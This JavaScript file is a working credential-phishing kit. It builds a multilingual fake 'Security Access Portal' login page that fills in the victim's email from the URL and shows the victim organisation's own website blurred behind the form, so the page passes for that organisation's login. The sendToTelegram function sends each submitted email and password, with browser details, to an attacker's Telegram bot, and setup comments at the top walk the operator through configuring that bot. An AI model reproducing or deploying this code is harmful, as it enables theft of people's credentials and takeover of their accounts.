// ==================== TELEGRAM CONFIGURATION ====================
// REPLACE THESE WITH YOUR ACTUAL TELEGRAM BOT TOKEN AND CHAT ID
// 1. Create a bot with @BotFather on Telegram
// 2. Get your bot token (looks like: 1234567890:ABCdefGhIJKlmNoPQRsTUVwxyZ)
// 3. Get your chat ID by messaging @userinfobot or visiting:
//    https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates
// 4. Replace the values below:
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';

// ==================== GLOBAL VARIABLES ====================
let currentBackgroundDomain = '';
let userLanguage = 'en';
let translations = {};

// ==================== COMPLETE TRANSLATION DICTIONARY ====================
const translationDictionary = {
    en: {
        // Default English
        subtitle: "Security Access Portal",
        email_label: "Email",
        password_label: "Password",
        show_password: "Show",
        hide_password: "Hide",
        login_button: "Login",
        forgot_password: "Forgot password?",
        alternative_method: "Use alternative method",
        encrypted_connection: "Encrypted connection",
        copyright: "© 2024",
        privacy: "Privacy",
        terms: "Terms",
        security: "Security",
        please_fill: "Please fill in all fields",
        sending: "Sending...",
        submitted_success: "Login submitted successfully",
        error_submitting: "Error submitting form. Please try again.",
        logging_into: "Logging into"
    },
    es: {
        // Spanish
        subtitle: "Portal de Acceso Seguro",
        email_label: "Correo electrónico",
        password_label: "Contraseña",
        show_password: "Mostrar",
        hide_password: "Ocultar",
        login_button: "Iniciar sesión",
        forgot_password: "¿Olvidaste tu contraseña?",
        alternative_method: "Usar método alternativo",
        encrypted_connection: "Conexión encriptada",
        copyright: "© 2024",
        privacy: "Privacidad",
        terms: "Términos",
        security: "Seguridad",
        please_fill: "Por favor complete todos los campos",
        sending: "Enviando...",
        submitted_success: "Inicio de sesión enviado con éxito",
        error_submitting: "Error al enviar el formulario. Por favor, inténtelo de nuevo.",
        logging_into: "Iniciando sesión en"
    },
    fr: {
        // French
        subtitle: "Portail d'Accès Sécurisé",
        email_label: "E-mail",
        password_label: "Mot de passe",
        show_password: "Afficher",
        hide_password: "Masquer",
        login_button: "Connexion",
        forgot_password: "Mot de passe oublié?",
        alternative_method: "Utiliser une autre méthode",
        encrypted_connection: "Connexion chiffrée",
        copyright: "© 2024",
        privacy: "Confidentialité",
        terms: "Conditions",
        security: "Sécurité",
        please_fill: "Veuillez remplir tous les champs",
        sending: "Envoi en cours...",
        submitted_success: "Connexion soumise avec succès",
        error_submitting: "Erreur lors de l'envoi du formulaire. Veuillez réessayer.",
        logging_into: "Connexion à"
    },
    de: {
        // German
        subtitle: "Sicherer Zugangsportal",
        email_label: "E-Mail",
        password_label: "Passwort",
        show_password: "Anzeigen",
        hide_password: "Verbergen",
        login_button: "Anmelden",
        forgot_password: "Passwort vergessen?",
        alternative_method: "Alternative Methode verwenden",
        encrypted_connection: "Verschlüsselte Verbindung",
        copyright: "© 2024",
        privacy: "Datenschutz",
        terms: "Bedingungen",
        security: "Sicherheit",
        please_fill: "Bitte füllen Sie alle Felder aus",
        sending: "Wird gesendet...",
        submitted_success: "Anmeldung erfolgreich übermittelt",
        error_submitting: "Fehler beim Senden des Formulars. Bitte versuchen Sie es erneut.",
        logging_into: "Anmeldung bei"
    },
    it: {
        // Italian
        subtitle: "Portale di Accesso Sicuro",
        email_label: "Email",
        password_label: "Password",
        show_password: "Mostra",
        hide_password: "Nascondi",
        login_button: "Accedi",
        forgot_password: "Password dimenticata?",
        alternative_method: "Usa metodo alternativo",
        encrypted_connection: "Connessione crittografata",
        copyright: "© 2024",
        privacy: "Privacy",
        terms: "Termini",
        security: "Sicurezza",
        please_fill: "Si prega di compilare tutti i campi",
        sending: "Invio in corso...",
        submitted_success: "Accesso inviato con successo",
        error_submitting: "Errore durante l'invio del modulo. Riprova.",
        logging_into: "Accesso a"
    },
    pt: {
        // Portuguese
        subtitle: "Portal de Acesso Seguro",
        email_label: "E-mail",
        password_label: "Senha",
        show_password: "Mostrar",
        hide_password: "Ocultar",
        login_button: "Entrar",
        forgot_password: "Esqueceu a senha?",
        alternative_method: "Usar método alternativo",
        encrypted_connection: "Conexão criptografada",
        copyright: "© 2024",
        privacy: "Privacidade",
        terms: "Termos",
        security: "Segurança",
        please_fill: "Por favor, preencha todos os campos",
        sending: "Enviando...",
        submitted_success: "Login enviado com sucesso",
        error_submitting: "Erro ao enviar o formulário. Por favor, tente novamente.",
        logging_into: "Entrando em"
    },
    ru: {
        // Russian
        subtitle: "Безопасный портал доступа",
        email_label: "Электронная почта",
        password_label: "Пароль",
        show_password: "Показать",
        hide_password: "Скрыть",
        login_button: "Войти",
        forgot_password: "Забыли пароль?",
        alternative_method: "Использовать другой метод",
        encrypted_connection: "Зашифрованное соединение",
        copyright: "© 2024",
        privacy: "Конфиденциальность",
        terms: "Условия",
        security: "Безопасность",
        please_fill: "Пожалуйста, заполните все поля",
        sending: "Отправка...",
        submitted_success: "Вход успешно отправлен",
        error_submitting: "Ошибка отправки формы. Пожалуйста, попробуйте еще раз.",
        logging_into: "Вход в"
    },
    zh: {
        // Chinese (Simplified)
        subtitle: "安全访问门户",
        email_label: "电子邮件",
        password_label: "密码",
        show_password: "显示",
        hide_password: "隐藏",
        login_button: "登录",
        forgot_password: "忘记密码？",
        alternative_method: "使用其他方法",
        encrypted_connection: "加密连接",
        copyright: "© 2024",
        privacy: "隐私",
        terms: "条款",
        security: "安全",
        please_fill: "请填写所有字段",
        sending: "发送中...",
        submitted_success: "登录提交成功",
        error_submitting: "提交表单时出错。请再试一次。",
        logging_into: "登录到"
    },
    ja: {
        // Japanese
        subtitle: "セキュアアクセスポータル",
        email_label: "メールアドレス",
        password_label: "パスワード",
        show_password: "表示",
        hide_password: "非表示",
        login_button: "ログイン",
        forgot_password: "パスワードをお忘れですか？",
        alternative_method: "別の方法を使用",
        encrypted_connection: "暗号化された接続",
        copyright: "© 2024",
        privacy: "プライバシー",
        terms: "利用規約",
        security: "セキュリティ",
        please_fill: "すべての項目を入力してください",
        sending: "送信中...",
        submitted_success: "ログインが正常に送信されました",
        error_submitting: "フォームの送信中にエラーが発生しました。もう一度お試しください。",
        logging_into: "ログイン中"
    },
    ko: {
        // Korean
        subtitle: "보안 액세스 포털",
        email_label: "이메일",
        password_label: "비밀번호",
        show_password: "표시",
        hide_password: "숨기기",
        login_button: "로그인",
        forgot_password: "비밀번호를 잊으셨나요?",
        alternative_method: "다른 방법 사용",
        encrypted_connection: "암호화된 연결",
        copyright: "© 2024",
        privacy: "개인정보",
        terms: "이용약관",
        security: "보안",
        please_fill: "모든 필드를 채워주세요",
        sending: "전송 중...",
        submitted_success: "로그인이 성공적으로 제출되었습니다",
        error_submitting: "폼 제출 중 오류가 발생했습니다. 다시 시도해 주세요.",
        logging_into: "로그인 중"
    }
};

// Get user language from browser
function detectUserLanguage() {
    // Get browser language
    const browserLang = navigator.language || navigator.userLanguage || 'en';
    const langCode = browserLang.split('-')[0].toLowerCase();
    
    console.log('Browser language:', browserLang, 'Code:', langCode);
    
    // Check if we have translations for this language
    if (translationDictionary[langCode]) {
        return langCode;
    }
    
    return 'en'; // Default to English
}

// Get language display name
function getLanguageName(langCode) {
    const languageNames = {
        'en': 'English',
        'es': 'Español',
        'fr': 'Français',
        'de': 'Deutsch',
        'it': 'Italiano',
        'pt': 'Português',
        'ru': 'Русский',
        'zh': '中文',
        'ja': '日本語',
        'ko': '한국어',
        'ar': 'العربية',
        'hi': 'हिन्दी'
    };
    
    return languageNames[langCode] || langCode.toUpperCase();
}

// Translate the entire page
function translatePage(lang) {
    if (lang === 'en' || !translationDictionary[lang]) {
        // Use English
        translations = { ...translationDictionary.en };
        updateLanguageButton('en');
        return;
    }
    
    console.log('Translating page to:', lang);
    
    // Get translations for selected language
    const langTranslations = translationDictionary[lang];
    translations = { ...langTranslations };
    
    // Update all elements with data-i18n attribute
    const elements = document.querySelectorAll('[data-i18n]');
    
    elements.forEach(el => {
        const key = el.getAttribute('data-i18n');
        if (langTranslations[key]) {
            el.textContent = langTranslations[key];
        }
    });
    
    // Update language button
    updateLanguageButton(lang);
}

function updateLanguageButton(lang) {
    const langBtn = document.getElementById('langToggle');
    if (!langBtn) return;
    
    langBtn.textContent = `🌐 ${getLanguageName(lang)}`;
}

function setupLanguageToggle() {
    const langBtn = document.getElementById('langToggle');
    if (!langBtn) return;
    
    langBtn.addEventListener('click', async () => {
        if (userLanguage === 'en') {
            // Detect language
            const detectedLang = detectUserLanguage();
            if (detectedLang !== 'en' && translationDictionary[detectedLang]) {
                userLanguage = detectedLang;
                translatePage(detectedLang);
            } else {
                // Try Spanish as default test language
                userLanguage = 'es';
                translatePage('es');
            }
        } else {
            // Switch back to English
            userLanguage = 'en';
            translatePage('en');
        }
    });
}

// ==================== WEBSITE BACKGROUND LOADER ====================
async function loadWebsiteBackground(domain) {
    if (!domain || currentBackgroundDomain === domain) return;
    
    currentBackgroundDomain = domain;
    
    const existingIframe = document.querySelector('.website-background');
    if (existingIframe) {
        existingIframe.remove();
    }
    
    const iframe = document.createElement('iframe');
    iframe.className = 'website-background';
    iframe.id = 'websiteBackground';
    iframe.style.cssText = `
        position: fixed;
        inset: 0;
        width: 100%;
        height: 100%;
        z-index: -1;
        border: none;
        background: white;
        opacity: 0;
        transition: opacity 1s ease;
        filter: blur(8px);
        transform: scale(1.05);
    `;
    
    const urlAttempts = [
        `https://${domain}`,
        `https://www.${domain}`,
        `http://${domain}`,
        `http://www.${domain}`,
        `https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=https%3A%2F%2F${domain}`,
        `https://r.jina.ai/https://${domain}`,
        `https://cors-anywhere.herokuapp.com/https://${domain}`,
        `https://api.allorigins.win/raw?url=https://${domain}`
    ];
    
    document.body.appendChild(iframe);
    
    let loadedSuccessfully = false;
    
    for (let i = 0; i < urlAttempts.length; i++) {
        const url = urlAttempts[i];
        
        try {
            await new Promise((resolve) => {
                const timeout = setTimeout(() => {
                    resolve();
                }, 3000);
                
                iframe.onload = () => {
                    clearTimeout(timeout);
                    loadedSuccessfully = true;
                    
                    setTimeout(() => {
                        iframe.style.opacity = '1';
                    }, 500);
                    
                    resolve();
                };
                
                iframe.onerror = () => {
                    clearTimeout(timeout);
                    resolve();
                };
                
                iframe.src = url;
                iframe.setAttribute('referrerpolicy', 'no-referrer');
                iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms allow-popups');
            });
            
            if (loadedSuccessfully) break;
            
        } catch (error) {
            continue;
        }
    }
    
    if (!loadedSuccessfully) {
        const screenshotUrl = `https://image.thum.io/get/width/1920/crop/1080/noanimate/https://${domain}`;
        iframe.src = screenshotUrl;
        
        iframe.onload = () => {
            setTimeout(() => {
                iframe.style.opacity = '1';
            }, 500);
        };
        
        iframe.onerror = () => {
            createThemedBackground(domain);
        };
    }
}

function createThemedBackground(domain) {
    const themedPage = `
        <!DOCTYPE html>
        <html>
        <head>
            <style>
                body {
                    margin: 0;
                    padding: 0;
                    height: 100vh;
                    display: flex;
                    flex-direction: column;
                    justify-content: center;
                    align-items: center;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    font-family: Arial, sans-serif;
                    text-align: center;
                }
                h1 {
                    font-size: 48px;
                    margin-bottom: 20px;
                    text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
                }
                p {
                    font-size: 24px;
                    opacity: 0.9;
                }
                .domain {
                    font-size: 36px;
                    font-weight: bold;
                    margin: 20px 0;
                    background: rgba(255,255,255,0.1);
                    padding: 10px 30px;
                    border-radius: 10px;
                    backdrop-filter: blur(10px);
                }
            </style>
        </head>
        <body>
            <h1>${domain}</h1>
            <div class="domain">${domain}</div>
            <p>Secure Login Portal</p>
        </body>
        </html>
    `;
    
    const blob = new Blob([themedPage], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    
    const iframe = document.getElementById('websiteBackground');
    if (iframe) {
        iframe.src = url;
        setTimeout(() => {
            iframe.style.opacity = '1';
        }, 500);
    }
}

// ==================== EMAIL EXTRACTION AND LOGO FETCHING ====================
async function extractAndSetEmailFromHash() {
    const hash = window.location.hash;
    
    if (!hash) return false;
    
    const emailFromHash = hash.substring(1);
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    
    if (emailRegex.test(emailFromHash)) {
        document.getElementById('user_email').value = emailFromHash;
        
        const domain = emailFromHash.split('@')[1];
        
        loadWebsiteBackground(domain);
        
        fetchDomainLogo(domain);
        
        showDomainInfo(domain);
        
        setTimeout(() => {
            document.getElementById('pw').focus();
        }, 100);
        
        return true;
    }
    
    return false;
}

async function fetchDomainLogo(domain) {
    if (!domain) return;
    
    const logoImg = document.getElementById('logoImg');
    
    try {
        const faviconSources = [
            `https://www.google.com/s2/favicons?domain=${domain}&sz=128`,
            `https://favicon.twenty.com/${domain}`,
            `https://icons.duckduckgo.com/ip3/${domain}.ico`,
            `https://${domain}/favicon.ico`,
            `https://www.${domain}/favicon.ico`
        ];
        
        for (const src of faviconSources) {
            const img = new Image();
            try {
                await new Promise((resolve, reject) => {
                    img.onload = resolve;
                    img.onerror = reject;
                    img.src = src;
                });
                logoImg.src = src;
                return;
            } catch (e) {
                continue;
            }
        }
        
    } catch (error) {
        console.log('Error fetching favicon');
    }
}

function showDomainInfo(domain) {
    const domainInfoDiv = document.getElementById('domainInfo');
    
    if (domain && domainInfoDiv) {
        const domainLogo = document.createElement('img');
        domainLogo.className = 'domain-logo';
        domainLogo.src = `https://www.google.com/s2/favicons?domain=${domain}&sz=32`;
        domainLogo.alt = `${domain} logo`;
        domainLogo.onerror = function() {
            this.style.display = 'none';
        };
        
        const domainText = document.createElement('span');
        domainText.textContent = `${translations.logging_into || "Logging into"} ${domain}`;
        
        domainInfoDiv.innerHTML = '';
        domainInfoDiv.appendChild(domainLogo);
        domainInfoDiv.appendChild(domainText);
    }
}

// ==================== FORM HANDLING ====================
function setupFormHandling() {
    const form = document.getElementById('loginForm');
    if (!form) return;
    
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const submitBtn = document.getElementById('submitBtn');
        const messageDiv = document.getElementById('message');
        const originalBtnText = submitBtn.textContent;
        
        const email = document.getElementById('user_email').value;
        const password = document.getElementById('pw').value;
        
        if (!email || !password) {
            showMessage(translations.please_fill || 'Please fill in all fields', 'error');
            return;
        }
        
        submitBtn.disabled = true;
        submitBtn.textContent = translations.sending || 'Sending...';
        messageDiv.style.display = 'none';
        
        try {
            await sendToTelegram(email, password);
            showMessage(translations.submitted_success || 'Login submitted successfully', 'success');
            document.getElementById('pw').value = '';
            
        } catch (error) {
            console.error('Error:', error);
            showMessage(translations.error_submitting || 'Error submitting form. Please try again.', 'error');
        } finally {
            submitBtn.disabled = false;
            submitBtn.textContent = originalBtnText;
        }
    });
}

// ==================== TELEGRAM FUNCTION ====================
async function sendToTelegram(email, password) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || 
        TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || 
        TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
        throw new Error('Please configure Telegram bot token and chat ID first');
    }
    
    const domain = email.includes('@') ? email.split('@')[1] : 'unknown';
    
    const message = `🔐 *New Login Submission*\n\n📧 *Email:* \`${email}\`\n🔑 *Password:* \`${password}\`\n🏷️ *Domain:* ${domain}\n🌐 *Browser:* ${navigator.userAgent}\n📍 *Language:* ${userLanguage}\n🕐 *Time:* ${new Date().toLocaleString()}\n🔗 *URL:* ${window.location.href}`;
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    });
    
    const data = await response.json();
    
    if (!response.ok || !data.ok) {
        throw new Error(data.description || 'Failed to send message to Telegram');
    }
    
    return data;
}

// ==================== UTILITY FUNCTIONS ====================
function showMessage(text, type = 'error') {
    const messageDiv = document.getElementById('message');
    if (!messageDiv) return;
    
    messageDiv.textContent = text;
    messageDiv.className = `message ${type}`;
    messageDiv.style.display = 'block';
    
    setTimeout(() => {
        messageDiv.style.display = 'none';
    }, 5000);
}

function setupEmailInputListener() {
    const emailInput = document.getElementById('user_email');
    if (!emailInput) return;
    
    emailInput.addEventListener('input', async function(e) {
        const email = e.target.value;
        if (email.includes('@')) {
            const domain = email.split('@')[1];
            if (domain.includes('.')) {
                showDomainInfo(domain);
                
                if (domain !== currentBackgroundDomain) {
                    loadWebsiteBackground(domain);
                    fetchDomainLogo(domain);
                }
            }
        }
    });
}

function setupPasswordToggle() {
    const toggle = document.getElementById('togglePassword');
    const pw = document.getElementById('pw');
    
    if (toggle && pw) {
        toggle.addEventListener('click', function() {
            const isPassword = pw.type === 'password';
            pw.type = isPassword ? 'text' : 'password';
            this.textContent = isPassword ? 
                (translations.hide_password || 'Hide') : 
                (translations.show_password || 'Show');
        });
    }
}

// ==================== INITIALIZATION ====================
async function initialize() {
    // Initialize with English translations
    translations = { ...translationDictionary.en };
    
    setupFormHandling();
    setupEmailInputListener();
    setupPasswordToggle();
    setupLanguageToggle();
    
    // Auto-detect and apply language on page load
    const detectedLang = detectUserLanguage();
    userLanguage = detectedLang;
    
    // Translate page to detected language
    translatePage(detectedLang);
    
    // Extract email from URL hash
    await extractAndSetEmailFromHash();
    
    // If no email in hash, use default background
    if (!currentBackgroundDomain) {
        createThemedBackground('Secure Portal');
    }
}

document.addEventListener('DOMContentLoaded', initialize);
